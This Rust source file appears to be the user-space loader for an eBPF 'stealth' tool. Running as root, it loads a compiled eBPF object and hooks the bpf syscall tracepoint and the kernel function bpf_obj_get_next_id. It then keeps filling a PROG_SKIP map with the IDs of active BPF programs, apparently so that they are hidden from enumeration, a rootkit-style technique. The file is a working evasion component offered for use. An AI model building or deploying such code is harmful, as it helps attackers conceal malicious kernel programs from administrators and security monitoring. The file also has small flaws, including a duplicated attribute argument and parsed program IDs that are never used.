use std::{fs, thread, time::Duration};

use anyhow::Context as _;
use aya::{
    maps::HashMap,
    programs::{KProbe, TracePoint},
    Btf,
};

#[rustfmt::skip]
use log::{debug, warn};
use clap::Parser;
use libbpf_rs::query::ProgInfoIter;
use tokio::signal;

#[derive(Parser, Debug)]
#[command(version, about, about,long_about = None)]
pub struct Arg {
    #[clap(short, long,value_parser, value_delimiter = ' ', num_args = 1..)]
    pub prog: Option<Vec<u32>>,
}

#[inline]
fn list_active_programs() -> Vec<u32> {
    let iter = ProgInfoIter::default();
    let mut active_programs = Vec::<u32>::new();
    for prog in iter {
        active_programs.push(prog.id);
    }
    active_programs
}
// bpf_obj_get_next_id(&attr, uattr.user,
//     &prog_idr, &prog_idr_lock)

// bpf_obj_get_next_id(__u32 start_id, __u32 *next_id, int cmd)
//     attr
// struct { /* anonymous struct used by BPF_*_GET_*_ID */
//     union {
//         __u32		start_id;
//         __u32		prog_id;
//         __u32		map_id;
//         __u32		btf_id;
//         __u32		link_id;
//     };
//     __u32		next_id;
//     __u32		open_flags;
// };

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    env_logger::init();

    if unsafe { libc::geteuid() } != 0 {
        eprintln!("This program must be run as root");
        std::process::exit(1);
    }
    let progs_id = Arg::parse()
        .prog
        .into_iter()
        .flatten()
        .collect::<Vec<u32>>();

    // Bump the memlock rlimit. This is needed for older kernels that don't use the
    // new memcg based accounting, see https://lwn.net/Articles/837122/
    let rlim = libc::rlimit {
        rlim_cur: libc::RLIM_INFINITY,
        rlim_max: libc::RLIM_INFINITY,
    };
    let ret = unsafe { libc::setrlimit(libc::RLIMIT_MEMLOCK, &rlim) };
    if ret != 0 {
        debug!("remove limit on locked memory failed, ret is: {}", ret);
    }

    // This will include your eBPF object file as raw bytes at compile-time and load it at
    // runtime. This approach is recommended for most real-world use cases. If you would
    // like to specify the eBPF program at runtime rather than at compile-time, you can
    // reach for `Bpf::load_file` instead.

    let mut ebpf = aya::Ebpf::load(aya::include_bytes_aligned!(concat!(
        env!("OUT_DIR"),
        "/stealth"
    )))?;
    if let Err(e) = aya_log::EbpfLogger::init(&mut ebpf) {
        // This can happen if you remove all log statements from your eBPF program.
        warn!("failed to initialize eBPF logger: {}", e);
    }

    let program0: &mut TracePoint = ebpf.program_mut("stealth_tracepoint").unwrap().try_into()?;
    program0.load()?;
    program0.attach("syscalls", "sys_enter_bpf")?;
    let program: &mut KProbe = ebpf.program_mut("stealth_probe").unwrap().try_into()?;
    program.load()?;
    program.attach("bpf_obj_get_next_id", 0)?;
    let ctrl_c = signal::ctrl_c();
    let mut prog_skip_map: HashMap<_, u32, u32> =
        HashMap::try_from(ebpf.take_map("PROG_SKIP").unwrap()).unwrap();

    thread::spawn(move || loop {
        thread::sleep(Duration::from_millis(1000));
        let active_programs = list_active_programs();
        for p in active_programs.into_iter() {
            if let Err(err) = prog_skip_map.insert(&p, &0, 0) {
                //error!("Error inserting map key : {}", err)
            }
        }
    });
    println!("Waiting for Ctrl-C...");
    ctrl_c.await?;
    println!("Exiting...");
    Ok(())
}
